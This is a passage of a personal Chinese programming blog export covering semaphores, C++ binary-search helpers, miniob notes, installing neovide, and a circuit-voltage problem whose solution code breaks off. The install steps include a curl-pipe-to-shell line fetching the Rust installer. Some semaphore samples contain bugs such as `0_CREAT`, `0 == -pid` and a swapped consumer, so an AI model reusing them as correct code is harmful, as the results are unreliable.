oflag表示创建文件的行为，一般为O_CREAT，即不存在则创建，存在则直接打开。</span></span><br><span class="line"><span class="comment">     mode表示其他组进程对信号量的访问权限</span></span><br><span class="line"><span class="comment">     value表示信号量的初值，但是本人在实验中怎样设置都是0。</span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Link with -pthread.</span><br></pre></td></tr></table></figure>
<b><font color = red>注意初次创建信号量时必须给出mode和value，其他进程打开时不给此项</font></b>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">sem_t</span> *sem_id = <span class="built_in">sem_open</span>(<span class="string">&quot;input&quot;</span>,O_CREAT,<span class="number">0777</span>,<span class="number">0</span>);   <span class="comment">// 不管初值设为多少，好像信号量初始值都为0</span></span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Parent Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);     <span class="comment">// -- 1</span></span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);   <span class="comment">// -- 2</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Child Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">sem_t</span> *sem;</span><br><span class="line">    sem = <span class="built_in">sem_open</span>(<span class="string">&quot;MY_SEM&quot;</span>, <span class="number">0</span>_CREAT, <span class="number">666</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="type">int</span> i= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(sem);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Process 1 : i = %d\n&quot;</span>, i++); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sem_close</span>(sem)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// file 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="type">sem_t</span> *sem;</span><br><span class="line">    sem = <span class="built_in">sem_open</span>(<span class="string">&quot;MY_SEM&quot;</span>, O_CREAT); </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Process 2 : i = %d\n&quot;</span>, i++); </span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">sem_post</span> (sem); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sem_close</span>(sem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="信号量怎样作为锁">信号量怎样作为锁</h2>
<p><a
href="https://blog.csdn.net/tjhon/article/details/14120213">sem_wait是原子操作</a><br />
<a
href="https://zhuanlan.zhihu.com/p/479824411">信号量如何实现锁</a><br />
实现锁需要原子操作，来保证上锁时锁的值不会被干扰,
使得上锁代码只能有一个进程处理，保证了原子性。<br />
<code>sem_wait(或sem_t *sem)</code>相当于P操作，即申请资源。
测试所指定信号量的值,它的操作是原子的。同理<code>int sem_post(sem_t *sem)</code>也是原子的，可以用作锁。<br />
由于只有<code>sem_wait</code>函数会发生阻塞，所以将其放在前方，保证未获取锁时阻塞。</p>
<p>如下所示，进程间信号的量实现的锁可如下所示:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">sem_t</span> *sem_id = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line">  sem_id = (<span class="type">sem_t</span> *)<span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(<span class="type">sem_t</span>), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);       <span class="comment">// MAP_SHARED 进程间共享</span></span><br><span class="line">  <span class="built_in">sem_init</span>(sem_id, <span class="number">1</span>, <span class="number">1</span>);       <span class="comment">//第二个参数为1表示进程间共享，为0表示线程间共享， 最后一个参数表示sem_id的初始值为1</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);     <span class="comment">// 加锁</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Parent Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);     <span class="comment">// 解锁</span></span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);             </span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == -pid) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">sem_wait</span>(sem_id);     <span class="comment">// 加锁</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This is Child Process\n&quot;</span>);</span><br><span class="line">      <span class="built_in">sem_post</span>(sem_id);   <span class="comment">// 解锁</span></span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述代码中进程会交替执行，打印效果如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">skt1faker@nwpu ~/rm</span><br><span class="line">$ ./a.out                                                                           [16:43:26]</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br><span class="line">This is Parent Process</span><br><span class="line">This is Child Process</span><br></pre></td></tr></table></figure> ##
信号量实现进程间生产者消费者模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 生产者</span><br><span class="line">void producer()&#123;</span><br><span class="line">sem_wait(queue_lock);        // 保护生产队列，上锁</span><br><span class="line">sem_wait(empty_slot);        // 消耗一个空槽</span><br><span class="line"></span><br><span class="line">sleep(1);   // 模拟生产过程</span><br><span class="line"></span><br><span class="line">sem_post(full_slot);        // 生产一个满槽</span><br><span class="line">sem_post(queue_lock);       // 解锁</span><br><span class="line">&#125;</span><br><span class="line">void costumer()&#123;</span><br><span class="line">sem_wait(queue_lock);        // 保护生产队列，上锁</span><br><span class="line">sem_post(full_slot);        // 消耗一个满槽</span><br><span class="line"></span><br><span class="line">sleep(1);                   // 模拟消费过程</span><br><span class="line"></span><br><span class="line">sem_wait(empty_slot);        // 生产一个空槽</span><br><span class="line">sem_post(queue_lock);       // 解锁</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="进程间的锁">进程间的锁</h1>
<p>进程间也能拥有锁，主要使用<code>pthread_mutex</code>与共享内存，一半这种函数主要用于线程中的互斥，但是如果在使用中设置了<code>PTHREAD_PROCESS_SHARED</code>选项，那么两个进程可以使用这样的锁进行同步。</p>
]]></content>
      <tags>
        <tag>信号</tag>
        <tag>信号量</tag>
        <tag>共享内存</tag>
      </tags>
  </entry>
  <entry>
    <title>lower_bound和upper_bound查找大于等于、小于等于、大于、小于的方法</title>
    <url>/2023/12/25/lower-bound%E5%92%8Cupper-bound%E6%9F%A5%E6%89%BE%E5%A4%A7%E4%BA%8E%E7%AD%89%E4%BA%8E%E3%80%81%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E%E3%80%81%E5%A4%A7%E4%BA%8E%E3%80%81%E5%B0%8F%E4%BA%8E%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>https://www.zhihu.com/question/63931004</p>
<p>常规情况下<code>lower_bound</code>查找的是大于等于，<code>upper_bound</code>查找的是大于，但是通过<code>great&lt;int&gt;()</code>可以将<code>lower_bound()</code>变为查找小于等于的函数，<code>upper_bound()</code>变为查找小于的函数
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a[<span class="number">3</span>] = &#123; <span class="number">1</span> , <span class="number">10</span> , <span class="number">20</span> &#125;;</span><br><span class="line">	<span class="built_in">sort</span>( a , a + <span class="number">3</span> , <span class="built_in">greater</span>&lt; <span class="type">int</span> &gt;() );</span><br><span class="line">	<span class="comment">//从大到小排序 </span></span><br><span class="line">	<span class="keyword">auto</span> t = <span class="built_in">lower_bound</span>( a , a + <span class="number">3</span> , <span class="number">5</span> , <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;() );</span><br><span class="line">	<span class="comment">// 小于等于5中最大的 </span></span><br><span class="line">	cout &lt;&lt; *t &lt;&lt; endl ;</span><br><span class="line">	<span class="keyword">auto</span> p = <span class="built_in">upper_bound</span>( a , a + <span class="number">3</span> , <span class="number">10</span> , <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;() );</span><br><span class="line">	<span class="comment">// 小与 10 中最大的</span></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl ;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：PHarr</span><br><span class="line">链接：https:<span class="comment">//www.zhihu.com/question/63931004/answer/828795483</span></span><br><span class="line">来源：知乎</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure></p>
<p>方法2：</p>
<p><code>auto iter = lower_bound</code>找到大于等于后，<code>iter--</code>的值便是小于，<code>auto iter = upper_bound</code>找到大于后，<code>iter--</code>的值便是小于等于.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::map&lt;<span class="type">int</span>, std::string&gt; myMap;</span><br><span class="line">    myMap[<span class="number">1</span>] = <span class="string">&quot;one&quot;</span>;</span><br><span class="line">    myMap[<span class="number">3</span>] = <span class="string">&quot;three&quot;</span>;</span><br><span class="line">    myMap[<span class="number">5</span>] = <span class="string">&quot;five&quot;</span>;</span><br><span class="line">    myMap[<span class="number">7</span>] = <span class="string">&quot;seven&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">auto</span> it = myMap.<span class="built_in">upper_bound</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (it == myMap.<span class="built_in">begin</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;No element is less than &quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        --it;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The largest key less than &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; with value &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>miniob_aggregation</title>
    <url>/2023/10/22/miniob-aggregation/</url>
    <content><![CDATA[<p>待办 - [ ] lex和yacc是如何联系起来的
RETURN_TOKEN中的宏就是在yacc中的标识，lex识别到字符串，返回给yacc一个宏,yacc对这些符号定义终结符和非终结符，并且一些终结符和非终结符都有相应的值
- [ ] 完善stmt中接收count参数的问题 注意这个错误 <img src="wocao.png"
alt="wocao" /> <img
src="miniob-aggregation/_注意列遍历要倒过来，不然会出现问题.png"
alt="_注意列遍历要倒过来，不然会出现问题" /> <img
src="miniob-aggregation/_生成stmt的时候列遍历要倒过来.png"
alt="_生成stmt的时候列遍历要倒过来" /></p>
<h2 id="mutil-index">mutil-index</h2>
<h3 id="分享一个接口">分享一个接口</h3>
<ol type="1">
<li>memmove(__item_at(index + 1), __item_at(index),
(static_cast<size_t>(size()) - index) * item_size()); //skt1faker:
用于有重叠字符串之间的复制</li>
<li>std::advance(iter,num); // skt1faker
iter必须是一个迭代器，向前移动num或者倒退（-num）个单位。</li>
<li>vector.swap和vector.assign的区别
swap之后的,原vector中的元素全部消失，assign之后，原vector中的元素依旧存在</li>
</ol>
<p>assign <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; temlist;</span><br><span class="line">temlist.assign(list.begin(), list.end());</span><br></pre></td></tr></table></figure> 一样的复制了一份数据，list中的数据不变。</p>
<p>swap <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; temlist;</span><br><span class="line">temlist.swap(list);</span><br></pre></td></tr></table></figure>
将list中数据全部移到temlist中，此时list中为空了</p>
<ul>
<li>需要修改一下比较还有初始化的逻辑。</li>
</ul>
]]></content>
      <tags>
        <tag>miniob</tag>
      </tags>
  </entry>
  <entry>
    <title>miniob_date</title>
    <url>/2023/10/17/miniob-date/</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>neovide安装与使用</title>
    <url>/2024/02/28/neovide%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="安装方法">安装方法</h1>
<p><a href="https://neovide.dev/installation.html">安装指南</a></p>
<h2 id="使用appimage-作为执行文件">1.使用appimage 作为执行文件</h2>
<p>将neovide.appimage加上可执行权限即可，<code>chmod + x neovide.appimage</code>。但这种方法存在一定缺陷，环境变量的设置会出现一定问题。例如在命令行中输入<code>:!g++ -v</code>与在终端输出的结果不一样.</p>
<p><img src="neovim_Appimage_g++-v.png" alt="neovim_Appimage_g++-v" />
<img src="rust_neovide_g++-v.png" alt="rust_neovide_g++-v" /></p>
<p>上方图片为neovide.appimage产生的输出，下方为使用rust编译的neovide产生的输出。<br />
上面环境变量<code>COLLECT_GCC=neovide.appimage</code>，编译c++程序后会导致报错。<br />
下面输出与终端中输出一致，编译程序输出正确。</p>
<h2 id="使用rust编译源码安装">2. 使用rust编译源码安装</h2>
<p>按照安装指南的引导，使用如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y curl \</span><br><span class="line">    gnupg ca-certificates git \</span><br><span class="line">    gcc-multilib g++-multilib cmake libssl-dev pkg-config \</span><br><span class="line">    libfreetype6-dev libasound2-dev libexpat1-dev libxcb-composite0-dev \</span><br><span class="line">    libbz2-dev libsndio-dev freeglut3-dev libxmu-dev libxi-dev libfontconfig1-dev \</span><br><span class="line">    libxcursor-dev</span><br><span class="line"></span><br><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf <span class="string">&quot;https://sh.rustup.rs&quot;</span> | sh</span><br><span class="line"></span><br><span class="line">cargo install --git https://github.com/neovide/neovide</span><br><span class="line"></span><br></pre></td></tr></table></figure>
无论你是否安装rust<code>curl --proto '=https' --tlsv1.2 -sSf "https://sh.rustup.rs" | sh</code>，最好执行一下，如果你安装了rust，直接按y，然后选择1默认安装的方式。或者不用上方命令，使用<code>rustup update</code>更新rust版本。</p>
<p>最后<code>cargo install --git https://github.com/neovide/neovide</code>，将项目使用rust编译，记住，一定要设置环境变量<code>CARGO_TARGET_DIR</code>例如<code>export CARGO_TARGET_DIR=$&#123;HOME&#125;/.cargo/bin</code>，如果没有这个设置，那么编译之后结果位置就没有指定，可能会编译到tmp中的某个文件夹中。</p>
<p>编译完成后，可执行文件就在<code>CARGO_TARGET_DIR</code>中</p>
<h1 id="配置文件">配置文件</h1>
<p><a href="https://neovide.dev/configuration.html">配置参考资料</a></p>
<p>配置文件直接方法nvim中的lua脚本中。这里给出当前配置情况。
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 配置方法情参考https://neovide.dev/configuration.html</span></span><br><span class="line">vim.g.neovide_fullscreen = <span class="literal">true</span>   <span class="comment">-- 设置客户端是否全屏</span></span><br><span class="line">vim.g.neovide_transparency = <span class="number">0.7</span>  <span class="comment">-- 设置客户端透明度</span></span><br><span class="line">vim.g.neovide_hide_mouse_when_typing = <span class="literal">true</span> <span class="comment">-- 控制输入时鼠标是否存在</span></span><br><span class="line"><span class="comment">-- 特效情况控制</span></span><br><span class="line">vim.g.neovide_cursor_vfx_mode = <span class="string">&quot;sonicboom&quot;</span> <span class="comment">-- normal与输入模式切换的特效</span></span><br><span class="line"><span class="comment">--vim.g.neovide_cursor_vfx_mode = &quot;ripple&quot;</span></span><br><span class="line"><span class="comment">--vim.g.neovide_cursor_vfx_mode = &quot;railgun&quot; -- 光标移动时的特效</span></span><br><span class="line"><span class="comment">--vim.g.neovide_cursor_vfx_mode = &quot;wireframe&quot;</span></span><br><span class="line">vim.g.neovide_cursor_animate_command_line = <span class="literal">true</span>  <span class="comment">--关闭切换状态时，光标在缓冲区窗口与命令行之间的跳动,true是开启这个特效</span></span><br><span class="line">vim.g.neovide_cursor_animate_in_insert_mode = <span class="literal">true</span>  <span class="comment">-- 开启insert状态光标特效情况，false无特效</span></span><br><span class="line">vim.g.neovide_profiler = <span class="literal">false</span><span class="comment">-- 可能是显示帧率的一个东西</span></span><br><span class="line">vim.g.neovide_refresh_rate = <span class="number">144</span>   <span class="comment">-- 设置刷新率</span></span><br><span class="line">vim.g.neovide_cursor_trail_size = <span class="number">0.8</span>   <span class="comment">-- 光标拖尾长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 如果进入neovide时输入法为中文输入法，那么说明中文输入法在输入法管理器中优先级比较高，把英文输入法的优先级调高即可</span></span><br><span class="line"><span class="comment">--neovide 设置结束</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>p2011-计算电压-高斯消元</title>
    <url>/2023/11/08/p2011-%E8%AE%A1%E7%AE%97%E7%94%B5%E5%8E%8B-%E9%AB%98%E6%96%AF%E6%B6%88%E5%85%83/</url>
    <content><![CDATA[<h1 id="计算电压">计算电压</h1>
<h2 id="题目背景">题目背景</h2>
<p>相信不少人轻松灭掉 1，2 两题（蒟蒻无视此句）
，我相信，大家对物理也是很有兴趣的（众人：我们对揍人也是很有兴趣的）
，那么，再奉上 100 分给 Physicaler 们。</p>
<h2 id="题目描述">题目描述</h2>
<p>现给定一个电阻网络，已知其中每条边上的电阻，和若干个点和负极之间的电压（电源电压不变）
，现在求任意两点之间的电压。</p>
<h2 id="输入格式">输入格式</h2>
<p>第一行四个正整数 <span class="math inline">\(n,m,k,q\)</span>，表示有
<span class="math inline">\(n\)</span>
个节点（可能是几个点用导线相连接，与一个点等价，编号为 <span
class="math inline">\(1\)</span> 至 <span
class="math inline">\(n\)</span>，<span class="math inline">\(0\)</span>
号节点为电源负极），<span class="math inline">\(m\)</span>
个定值电阻（每个定值电阻连接两个点），电源正极有 <span
class="math inline">\(k\)</span> 个接口，有 <span
class="math inline">\(q\)</span> 个询问。</p>
<p>接下来 <span class="math inline">\(k\)</span>
行，每行两个正整数，表示这个正极的编号与该接线柱与电源负极之间的电压
<span class="math inline">\(u_i\)</span>。</p>
<p>再接下来 <span class="math inline">\(m\)</span> 行，每行三个正整数
<span class="math inline">\(v_i,w_i,r_i\)</span>，表示节点 <span
class="math inline">\(v_i\)</span> 与 <span
class="math inline">\(w_i\)</span> 之间有一条阻值为 <span
class="math inline">\(r_i\)</span> 的电阻丝。</p>
<p>再接下来 <span class="math inline">\(q\)</span> 行，每行两个正整数
<span class="math inline">\(a_i,b_i\)</span>，表示要求 <span
class="math inline">\(a_i\)</span> 与 <span
class="math inline">\(b_i\)</span> 之间的电压。</p>
<h2 id="输出格式">输出格式</h2>
<p>一共 <span class="math inline">\(q\)</span> 行，每行一个实数表示
<span class="math inline">\(a_i\)</span> 与 <span
class="math inline">\(b_i\)</span> 之间的电压（保留两位小数）。若 <span
class="math inline">\(a_i\)</span> 点电压小于 <span
class="math inline">\(b_i\)</span> 点电压，输出负值。</p>
<h2 id="样例-1">样例 #1</h2>
<h3 id="样例输入-1">样例输入 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 5 1 3</span><br><span class="line">1 18</span><br><span class="line">1 2 6</span><br><span class="line">1 3 2</span><br><span class="line">2 3 6</span><br><span class="line">3 0 6</span><br><span class="line">2 0 2</span><br><span class="line">1 0</span><br><span class="line">2 3</span><br><span class="line">1 2</span><br></pre></td></tr></table></figure>
<h3 id="样例输出-1">样例输出 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18.00</span><br><span class="line">-6.00</span><br><span class="line">12.00</span><br></pre></td></tr></table></figure>
<h2 id="提示">提示</h2>
<p>【数据范围】</p>
<p>对于 <span class="math inline">\(10\%\)</span> 的数据，<span
class="math inline">\(1\le q\le 10\)</span>；</p>
<p>对于 <span class="math inline">\(20\%\)</span> 的数据，<span
class="math inline">\(1\le n\le
10\)</span>，且保证电路为串联、并联或混联；</p>
<p>对于 <span class="math inline">\(40\%\)</span> 的数据，<span
class="math inline">\(1\le n\le 40\)</span>，<span
class="math inline">\(k\le 5\)</span>；</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据，<span
class="math inline">\(1\le k\le n\le 200\)</span>，<span
class="math inline">\(1\le m\le 2\times 10^5\)</span>，<span
class="math inline">\(1\le r_i,u_i\le 10^4\)</span>，<span
class="math inline">\(1\le q\le 10^6\)</span>。</p>
<p>【时空限制】</p>
<p>时间限制：1.00s，空间限制：125.00MB。</p>
<p>【样例解释】</p>
<p>如图所示。</p>
<figure>
<img src="https://cdn.luogu.com.cn/upload/pic/722.png" alt="样例解释" />
<figcaption aria-hidden="true">样例解释</figcaption>
</figure>
<h1 id="题解">题解</h1>
<p>主要思路是对于一个节点，流入的电流和流出的电流量是一样的，我们将流入某一节点的电流量表示为正数，流出某一节点的电流量视为负数，那么将其加起来和就是0，于是对于每一个节点列这样一个方程组就能解出来所有节点的电压。</p>
<figure>
<img src="1.png" alt="方程组" />
<figcaption aria-hidden="true">方程组</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    p2011.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  08:43  2023.11.08</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG1</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">202</span>;</span><br><span class="line"><span class="type">double</span> G[maxx][maxx];</span><br><span class="line"><span class="type">int</span> vis[maxx];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt;= n + <span class="number">1</span>;j++)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%0.2lf &quot;</span>,G[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">  